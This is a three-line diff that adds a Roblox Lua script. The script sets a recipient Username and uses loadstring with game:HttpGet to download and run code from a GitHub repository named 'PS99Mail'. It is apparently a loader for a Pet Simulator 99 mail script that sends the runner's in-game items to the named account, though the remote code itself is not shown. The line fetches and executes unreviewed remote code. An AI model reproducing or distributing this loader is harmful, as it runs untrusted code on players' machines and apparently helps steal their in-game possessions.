@@ -1,0 +1,3 @@
+Username = "Mus6afa6ix"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
